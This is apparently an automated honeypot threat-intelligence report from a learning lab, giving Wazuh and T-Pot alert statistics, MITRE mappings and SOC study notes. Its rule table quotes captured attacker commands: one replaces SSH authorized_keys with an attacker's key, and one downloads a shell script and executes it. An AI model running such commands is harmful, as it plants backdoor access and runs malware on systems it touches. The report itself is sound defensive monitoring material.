# LearningLab01 Daily Threat Intelligence Report — 2026-10-13

Generated: 2026-10-13T13:15:05.062Z

Report window: 2026-10-12T13:15:05.028Z through 2026-10-13T13:15:05.028Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 339,616 |
| Attack-related alerts | 16,574 |
| Honeypot interactions | 313,570 |
| Authentication failures | 2,181 |
| Authentication successes | 503 |
| Critical alerts | 182 |
| High alerts | 479 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 182 critical-severity alerts require priority review.
- 479 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 4.34:1.
- Country attribution currently covers only 19.89% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (207,683 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 182 | 0.05% |
| High | 479 | 0.14% |
| Medium | 2,624 | 0.77% |
| Low | 336,331 | 99.03% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 2,181
- Authentication successes: 503
- Failure-to-success ratio: 4.34:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 11,433 | 68.98% |
| Payload delivery | 11,433 | 68.98% |
| Authentication failure | 2,181 | 13.16% |
| Command execution | 1,703 | 10.28% |
| Reconnaissance | 758 | 4.57% |
| Network scan | 292 | 1.76% |
| Malware | 172 | 1.04% |
| SMTP attack | 47 | 0.28% |
| Web attack | 39 | 0.24% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 67,548 alerts, representing 19.89% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 272,068 | 80.11% | Not geolocated |
| Bulgaria | 45,114 | 13.28% | ████████████████████ |
| Ukraine | 21,040 | 6.20% | █████████ |
| Republic of Moldova | 638 | 0.19% | █ |
| Germany | 381 | 0.11% | █ |
| Romania | 158 | 0.05% | █ |
| United Kingdom | 140 | 0.04% | █ |
| United States | 69 | 0.02% | █ |
| British Virgin Islands | 4 | 0.00% | █ |
| Netherlands | 4 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 294 |
| Initial Access | 293 |
| Persistence | 293 |
| Privilege Escalation | 293 |
| Lateral Movement | 98 |
| Credential Access | 42 |
| Execution | 23 |
| Command and Control | 12 |
| Impact | 11 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 293 |
| Remote Services | 98 |
| Brute Force | 42 |
| Command and Scripting Interpreter | 23 |
| Ingress Tool Transfer | 12 |
| Stored Data Manipulation | 11 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 207,683 | T-Pot RDP connection from [IP address] to port 3389. | tpot (207,683) |
| 110219 | 4 | 67,075 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html HTTP/1.1" 302 - | tpot (67,075) |
| 110204 | 4 | 21,574 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (21,574) |
| 110101 | 3 | 20,992 | Cowrie SSH connection from [IP address]. | tpot (20,992) |
| 110205 | 6 | 11,378 | T-Pot Honeytrap received a payload from [IP address] | tpot (11,378) |
| 110102 | 5 | 2,181 | Cowrie failed login from [IP address] using username root. | tpot (2,181) |
| 110209 | 5 | 2,176 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (2,176) |
| 110207 | 5 | 1,795 | T-Pot SentryPeer SIP activity from [IP address]:50282, method INVITE | tpot (1,795) |
| 110104 | 7 | 1,486 | Cowrie captured a command from [IP address]:  | tpot (1,486) |
| 110201 | 4 | 807 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (807) |
| 110214 | 9 | 284 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (284) |
| 110222 | 9 | 277 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (277) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110103 | 10 | 210 | Cowrie accepted login from [IP address] using username root. | tpot (210) |
| 5501 | 3 | 195 | PAM: Login session opened. | tpot (193), wazuh (2) |
| 110109 | 13 | 182 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (182) |
| 5502 | 3 | 170 | PAM: Login session closed. | tpot (168), wazuh (2) |
| 110105 | 12 | 137 | Cowrie captured a file download from [IP address]. | tpot (137) |
| 110221 | 7 | 125 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (125) |
| 110216 | 4 | 102 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (102) |
| 5715 | 3 | 98 | sshd: authentication success. | tpot (97), wazuh (1) |
| 110220 | 8 | 71 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (71) |
| 110215 | 4 | 57 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (57) |
| 110212 | 10 | 55 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (55) |
| 110217 | 7 | 47 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (47) |
| 110106 | 10 | 42 | Cowrie detected repeated failed logins from [IP address]. | tpot (42) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110223 | 5 | 39 | T-Pot HoneyAML received  request from  to  on port . | tpot (39) |
| 110108 | 12 | 23 | Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x49\x4c\x52\x4d\x58\x56' | tpot (23) |
| 110208 | 7 | 17 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:20662 | tpot (17) |
| 110107 | 12 | 12 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (12) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110211 | 9 | 8 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (8) |
| 2904 | 7 | 5 | Dpkg (Debian Package) half configured. | tpot (5) |
| 202 | 7 | 4 | Agent event queue is 90% full. | tpot (4) |
| 205 | 3 | 4 | Agent event queue is back to normal load. | tpot (4) |
| 2902 | 7 | 3 | New dpkg (Debian Package) installed. | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
